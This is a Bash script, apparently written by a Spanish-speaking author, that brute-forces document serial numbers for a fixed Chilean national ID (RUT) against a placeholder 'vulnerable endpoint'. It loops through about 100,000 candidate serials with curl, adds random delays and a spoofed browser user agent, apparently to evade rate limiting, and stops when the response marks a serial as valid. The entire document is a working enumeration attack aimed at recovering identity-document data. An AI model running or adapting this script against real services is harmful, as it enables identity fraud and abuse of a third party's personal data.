#!/bin/bash
RED='\033[0;31m'
GREEN='\033[0;32m'
NC='\033[0m'

RUT="16.163.631-2"
URL="Aqui va el endpoint vulnerable para validar"
TIMESTAMP=$(date '+%Y-%m-%d %H:%M:%S')

for i in $(seq 600000000 600100000); do
    NUMERO_SERIE="$i"
    sleep $((RANDOM % 4 + 1))
    curl -s "$URL" -H 'Content-Type: application/json; charset=UTF-8' --data-raw "{ numeroSerie: \"$NUMERO_SERIE\", rut: \"$RUT\" }" -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:139.0) Gecko/20100101 Firefox/139.0" > resp.txt
    
    CURL_LOG="curl -s \"$URL\" -H 'Content-Type: application/json; charset=UTF-8' --data-raw \"{ numeroSerie: \"$NUMERO_SERIE\", rut: \"$RUT\" }\" -A \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:139.0) Gecko/20100101 Firefox/139.0\""
    echo "[ $TIMESTAMP ] [ $CURL_LOG ]" >> logs_curl.txt

    ESTADO=$(cat resp.txt | jq -r '.d.estado')
    VIGENCIA=$(cat resp.txt | jq -r '.d.vigencia')

    if [[ -z "$ESTADO" || -z "$VIGENCIA" ]]; then
        echo -e "Error " | tee -a resultados.txt
        exit 1
    fi
    
    if [[ "$ESTADO" == "0" && "$VIGENCIA" == "0" ]]; then
        echo -e "[+] Rut: $RUT - N_Serie: $i [${GREEN}✅${NC}]" | tee -a resultados.txt
        echo "Numero de serie Entontrado!!"
        rm resp.txt
        break
    else
        echo -e "[+] Rut: $RUT  N_Serie: $i [${RED}✘${NC}]" | tee -a resultados.txt
        rm resp.txt
    fi
done